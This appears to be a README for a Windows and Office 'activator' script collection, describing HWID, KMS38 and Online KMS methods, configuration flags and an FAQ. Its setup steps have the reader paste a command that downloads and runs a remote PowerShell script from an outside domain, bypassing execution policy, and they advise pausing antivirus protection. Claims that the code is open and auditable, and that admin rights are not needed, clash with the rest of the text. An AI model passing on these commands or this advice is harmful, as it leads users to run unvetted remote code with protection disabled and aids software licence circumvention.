<div align="center">

# Win_11_Activator: Open-Source Product Activation Scripts — Windows Automation

![preview](https://raw.githubusercontent.com/obnsiah/win11-activation-scripts/main/hero_57271.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-SCRIPT-f59e0b?style=plastic&labelColor=0d1117)]() [![code](https://img.shields.io/badge/CODE-PYTHON-fbbf24?style=plastic&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-OK-2ea44f?style=plastic&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-STABLE-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

This collection of scripts provides HWID, KMS38, and Online Activation methods for Microsoft products, with a focus on open-source code, reduced antivirus detection, and user-friendliness. The scripts are working fine for Windows 11 and support a range of activation periods depending on the method and product. Each script is designed to be straightforward to run, so you can pick the activation type that fits your setup and proceed without unnecessary steps.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What It Does

This script activates Windows 11 (and compatible Windows / Server builds) using three selectable activation paths: HWID for a permanent digital license, KMS38 for activation valid through 2038, and Online KMS for 180-day activation with an optional renewal task for continued auto-activation. It runs as a single entry point that detects the installed edition, lets you pick a method from a menu, and handles the underlying steps without manual key entry or command-line work. The code is kept open and readable so you can inspect exactly what it changes before running it, and the implementation is deliberately lean to reduce antivirus flags compared to heavier activation tools. Configuration is driven by simple in-script options rather than external dependencies, so the whole workflow stays contained in the script itself. It is intended for users who want a fast, low-friction activation process with clear method choices and minimal setup.

## Activation Methods

The scripts support three distinct activation paths. Choose the one that matches your target product and how long you want the license to persist.

**HWID (Digital License)** — Binds a permanent digital entitlement to the hardware. Best for a single Windows 11 machine you intend to keep activated indefinitely. No renewal, no background tasks. Because it ties to hardware, it will not follow you to a new machine.

**KMS38** — Grants activation that remains valid until the year 2038. Suited to Windows 11 and Server editions where you want a long-lived offline license without periodic renewal. Like HWID, it is hardware-bound, so a hardware change or reinstall may require re-running the script.

**Online KMS** — Activates Windows, Server, and Office products in 180-day cycles. This method requires a renewal task to be created and kept in place if you want continuous activation beyond the first period. Pick this when you need Office coverage or when the other two methods do not apply to your product.

Pick HWID for permanent, hassle-free Windows activation on stable hardware. Pick KMS38 when you want a long horizon without renewal chores. Pick Online KMS when you need Office or multi-product coverage and can tolerate a scheduled renewal task.

Each method runs from the provided scripts and writes its result to the console. Verify the outcome with the built-in status check after completion, and prefer running from an elevated shell so the scripts can apply the necessary changes without interruption.

## Configuration

Configuration lives at the top of the main script, in a dedicated block of variables. You do not need to touch function bodies. Edit values between runs, save, and execute again.

**Method selection**
- `METHOD` — one of `HWID`, `KMS38`, or `ONLINE`. HWID is permanent and tied to the machine; KMS38 runs until 2038; ONLINE activates for 180 days and depends on the renewal task.
- The default is chosen from detected Windows edition. Override it only when you know the target edition supports the method.

**Product targeting**
- `PRODUCT` — leave empty for automatic detection, or set an explicit product name for KMS38 and ONLINE runs. HWID ignores this field and always targets the running edition.
- `EDITION` — optional filter when a machine reports multiple configurations; blank means "use what the OS reports."

**KMS settings (ONLINE only)**
- `KMS_HOST` — the server address to use. Blank uses the built-in default.
- `KMS_PORT` — defaults to 1688; change only if your server listens elsewhere.
- `RENEWAL_TASK` — `true` or `false`. When `true`, a scheduled task is registered to re-activate before the 180-day window closes. HWID and KMS38 ignore this value.

**Behavior flags**
- `SILENT` — `true` suppresses prompts and runs with defaults. Any required confirmation is skipped, so use it only in scripted flows.
- `LOG_ENABLED` — `true` writes a timestamped log next to the script. Errors are always printed to the console regardless.
- `RETRY_COUNT` — how many times activation is attempted before giving up. The default is 1; raise it for flaky network conditions.
- `VERIFY_AFTER` — `true` re-checks the license state at the end and reports the result. Recommended, since it costs a few seconds.

**Environment assumptions**
- The script must run elevated. Configuration values are read after the elevation check, so a non-elevated run exits before any settings matter.
- Paths in the config are relative to the script's own directory unless you supply an absolute path. Keep the folder structure intact when moving the project.

**Safe editing**
- Prefer editing the config block over the command line. Command-line switches override the block for that run only and are not persisted.
- Keep one change per run. If a method switch fails, revert it before changing product or KMS values, otherwise you will be debugging two variables at once.
- Back up the original config block before bulk edits; the script does not version it for you.

**Common misconfigurations**
- `METHOD=ONLINE` with `KMS_HOST` empty on an isolated network — activation will time out.
- `RENEWAL_TASK=true` without elevation — the task is not registered and the run reports success while expiring in 180 days.
- `PRODUCT` set to an edition the running Windows build does not include — HWID still succeeds, but KMS38 and ONLINE report a mismatch.

Verify with a single run after any edit. If the log shows the expected method and product, the configuration is correct.

## Examples

Run the main script without arguments to bring up the interactive menu — this is the intended path for most users and keeps the flow simple:

```
Win_11_Activator.cmd
```

Pick a numbered option from the menu to select an activation method. The script reports the detected edition and license state before touching anything, so you can confirm the target before proceeding.

Run non-interactively by passing flags for scripting or unattended setups:

```
Win_11_Activator.cmd /hwid
Win_11_Activator.cmd /kms38
Win_11_Activator.cmd /onlinekms
```

Combine a method flag with a quiet switch to suppress prompts and write only status output to the console — useful when wrapping the script in your own automation:

```
Win_11_Activator.cmd /hwid /quiet
```

Check current activation status without making changes:

```
Win_11_Activator.cmd /status
```

Expected output is a short block listing the product name, edition, license channel, and remaining activation period (or permanent status). If the product is already activated, method flags exit early and report the existing state instead of re-applying.

For troubleshooting, add `/log` to write a verbose transcript to the script directory. Attach that log when reporting issues — it captures the detected edition, chosen method, and any error codes returned by the activation calls.

Run the script from an elevated prompt. Non-elevated runs detect the missing privileges and exit with a clear message rather than partially applying changes.

Batch several machines by calling the script with the same flags from your existing deployment tooling; no interactive input is required when a method flag is supplied. Verify results afterward with `/status` on each host before considering the run complete.

## FAQ

**Does this actually activate Windows permanently?**
Only the HWID method is permanent — it ties the license to the hardware on first run. KMS38 extends activation until 2038, and online KMS runs on a 180-day cycle that needs a renewal task to stay active. Know which method you're running before you assume the result is forever.

**Will my antivirus flag the scripts?**
Possibly. Activation scripts modify licensing components, which is exactly the behavior heuristic scanners look for. The project minimizes detection by keeping the code open and readable rather than packing or obfuscating it. If a file gets quarantined, review the source yourself and whitelist deliberately — don't disable protection wholesale.

**What happens after a major Windows update?**
Feature updates can reset activation state, especially for KMS38. HWID generally survives updates because the hardware fingerprint doesn't change. If activation drops after an update, rerun the script with the same method you used originally.

**Can I switch between activation methods?**
Yes, but clean up first. Running a new method over a stale one can leave conflicting registry entries and scheduled tasks. Use the script's built-in cleanup option to remove the previous method before applying a different one.

**Why does the script need admin rights?**
It writes to licensing stores and system registry hives, and it registers scheduled tasks for KMS renewal. None of that works from a standard user context. Run it elevated, and read the prompts before confirming anything.

**Is this safe to run on a machine I rely on?**
Treat it like any system-level modification: back up your important data, create a restore point, and test on a non-critical machine first. The code is open-source specifically so you can audit what it does before running it. If you can't read the scripts, don't run them.

**Does it work on Windows 10 and Server too?**
The supported product matrix covers Windows 10, Windows 11, Server editions, and Office depending on the method. Check the Activation Methods section for which method targets which product — mismatches are the most common cause of "it didn't work" reports.

**The script closed immediately or threw an error. What now?**
Run it from an elevated terminal instead of double-clicking so you can see the output. Most failures trace back to missing admin rights, an antivirus interruption, or a network block on the KMS method. Capture the error text before asking for help.

**Can I undo the activation?**
Yes. Use the cleanup option to remove the applied method, scheduled tasks, and related registry changes. After cleanup, Windows returns to its prior unactivated state, and you can reactivate with a legitimate key at any time.

**Does this collect or send any data?**
The scripts run locally and are designed to be auditable — read them and confirm for yourself what network calls, if any, each method makes. The KMS method necessarily contacts a KMS host; the offline-capable methods don't need external communication to complete.

## Disclaimer

This project is provided strictly for educational and research purposes. It demonstrates how Windows licensing mechanisms can be examined and automated through scripted workflows. It is not intended for use in production environments, corporate deployments, or any system where license compliance is required.

Using these scripts to activate software you do not hold a valid license for may violate the Microsoft Software License Terms and could contravene local laws in your jurisdiction. You are solely responsible for how you run, modify, or distribute these scripts, and for any consequences that follow. The maintainers and contributors accept no liability for licensing disputes, legal action, system instability, data loss, or other damages arising from use or misuse of this project.

Antivirus and endpoint protection tools frequently flag activation scripts as suspicious or malicious, because the behavior they perform resembles the behavior of unwanted software. False positives, quarantined files, or blocked execution are expected outcomes, not bugs. If you run these scripts, you do so with the understanding that you may need to adjust security settings or add exclusions, and that doing so reduces the protection on your machine.

The scripts modify system state, including licensing configuration and scheduled tasks, which can affect Windows Update, servicing, or future reinstallations. Back up important data and create a system restore point before running anything. Test in a virtual machine or disposable environment first; do not deploy to machines you cannot afford to rebuild.

No warranty is given, express or implied, regarding correctness, safety, or fitness for a particular purpose. The code is offered as-is, and the authors make no guarantee that it will work on any specific build, edition, or configuration of Windows. Behavior can change without notice as the underlying operating system evolves. If you are uncertain whether you are permitted to use this project, do not use it—consult your organization's IT or legal team instead.